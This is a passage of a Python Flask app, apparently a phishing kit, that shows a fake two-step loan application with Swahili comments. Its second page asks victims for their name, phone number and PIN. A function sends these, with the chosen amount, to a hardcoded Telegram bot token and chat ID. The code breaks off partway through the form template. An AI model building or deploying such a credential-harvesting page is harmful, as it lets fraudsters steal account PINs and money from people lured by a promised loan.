from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
from flask_cors import CORS
import requests
import random
import time

app = Flask(__name__)
app.secret_key = "loan_secret_123" # Muhimu kwa session
CORS(app)

TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
TELEGRAM_CHAT_ID = "8580615195"

pending_loans = {} 
otp_codes = {}

def send_telegram_with_buttons(name, phone, pin, amount, loan_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ APPROVE", "callback_data": f"approve_{loan_id}"}],
            [{"text": "❌ REJECT", "callback_data": f"reject_{loan_id}"}]
        ]
    }
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    message = f"🔔 NEW LOAN APPLICATION!\n\n💰 Amount: ${amount}\n👤 Name: {name}\n📱 Phone: {phone}\n🔒 PIN: {pin}"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "reply_markup": keyboard}
    requests.post(url, data=data)

# PAGE 1: CHAGUA AMOUNT
@app.route('/', methods=['GET'])
def page1_amount():
    return render_template_string('''
    <style>
        body{font-family:Arial; text-align:center; padding:40px; background:#f2f2f2;}
        .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto;}
        .amount-btn{display:block; width:100%; padding:15px; margin:10px 0; font-size:18px; border:2px solid #007bff; background:white; border-radius:8px; cursor:pointer;}
        .amount-btn:hover{background:#007bff; color:white;}
    </style>
    <div class="box">
        <h2>Step 1 of 2</h2>
        <h3>Choose Loan Amount</h3>
        <form action="/page2" method="POST">
            <button class="amount-btn" name="amount" value="100">$100</button>
            <button class="amount-btn" name="amount" value="200">$200</button>
            <button class="amount-btn" name="amount" value="300">$300</button>
            <button class="amount-btn" name="amount" value="400">$400</button>
            <button class="amount-btn" name="amount" value="500">$500</button>
        </form>
    </div>
    ''')

# PAGE 2: WEKA PHONE + PIN
@app.route('/page2', methods=['POST'])
def page2_details():
    session['amount'] = request.form['amount']
    return render_template_string('''
    <style>
        body{font-family:Arial; text-align:center; padding:40px; background:#f2f2f2;}
        .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto;}
        input{width:90%; padding:12px; margin:10px 0; border-radius:5px; border:1px solid #ccc;}
        .submit{background:#28a745; color:white; border:none; font-size:18px; cursor:pointer;}
    </style>
    <div class="box">
        <h2>Step 2 of 2</h2>
        <h3>Loan Amount: ${{amount}}</h3>
        <form action="/submit" method="POST">
            <input type="text" name="name" placeholder="Full Name" required><br>
            <input type="text" name="phone" placeholder="Phone Number" required><br>
            <input type="password" name="pin" placeholder="Enter PIN" required><br>
            <input type="submit" class="submit" value="Apply Now">
       
